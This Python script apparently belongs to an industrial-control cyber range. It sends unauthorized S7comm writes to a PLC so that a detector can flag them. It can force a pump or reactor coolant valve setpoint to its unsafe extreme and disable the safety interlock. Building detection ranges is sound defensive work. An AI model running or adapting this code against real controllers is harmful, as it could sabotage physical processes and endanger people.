#!/usr/bin/env python3
# SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
"""Manual single-shot S7 write to the PLC from the engineering workstation.

Drives the Range Console's MALICIOUS control path: a direct, unauthorized S7comm
write from the ews to the PLC. Because it crosses the ews network namespace, the
Zeek sidecar captures it and Kaaval flags it (unauthorized_s7_command). Contrast
with the legitimate operator path (backend -> gateway over OPC UA), which never
transits the ews and is therefore not flagged.

Scenario-agnostic: the danger-control and interlock tags come from the ACTIVE
process map (sim/ mounted at /opt/sim, KAAVAL_PROCESS). 'setpoint' writes the
process's danger-control tag (pump setpoint / reactor coolant valve); 'unsafe'
forces it to its dangerous extreme; 'interlock on|off' arms/defeats the interlock.

Usage:
  manual_write.py setpoint <value>   # write the danger-control tag
  manual_write.py unsafe             # force the danger-control tag to its unsafe extreme
  manual_write.py interlock <on|off> # arm/disable the safety interlock
  manual_write.py pump_max           # alias of 'unsafe' (back-compat)
"""

import os
import struct
import sys

sys.path.insert(0, os.environ.get("KAAVAL_SIM_PATH", "/opt/sim"))
import processes  # noqa: E402
from snap7.client import Client  # noqa: E402

PLC_HOST = os.environ.get("PLC_HOST", "plc")
PLC_PORT = int(os.environ.get("S7_PORT", "102"))


def main(argv):
    if not argv:
        print("usage: manual_write.py setpoint <value> | unsafe | interlock <on|off> | pump_max",
              file=sys.stderr)
        return 2
    op = argv[0]
    p = processes.load()
    by_name = {t.name: t for t in p.TAGS}
    s = p.SAFETY
    db = p.DB_NUMBER
    ctrl = by_name[s["danger_control_tag"]]
    interlock = by_name[s["interlock_tag"]]

    cli = Client()
    cli.connect(PLC_HOST, 0, 1, tcp_port=PLC_PORT)
    try:
        if op in ("setpoint", "unsafe", "pump_max"):
            val = float(argv[1]) if op == "setpoint" else float(s["danger_control_value"])
            buf = bytearray(4)
            struct.pack_into(">f", buf, 0, val)
            cli.db_write(db, ctrl.offset, buf)
            print(f"[manual] ews->plc S7 write: {ctrl.name}={val:.0f}")
        elif op == "interlock":
            on = argv[1].lower() in ("on", "true", "1", "arm", "armed")
            cur = cli.db_read(db, interlock.offset, 1)
            b = bytearray([cur[0]])
            if on:
                b[0] |= (1 << interlock.bit)
            else:
                b[0] &= ~(1 << interlock.bit) & 0xFF
            cli.db_write(db, interlock.offset, b)
            print(f"[manual] ews->plc S7 write: {interlock.name}={'on' if on else 'off'}")
        else:
            print(f"[manual] unknown op {op}", file=sys.stderr)
            return 2
    finally:
        cli.disconnect()
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
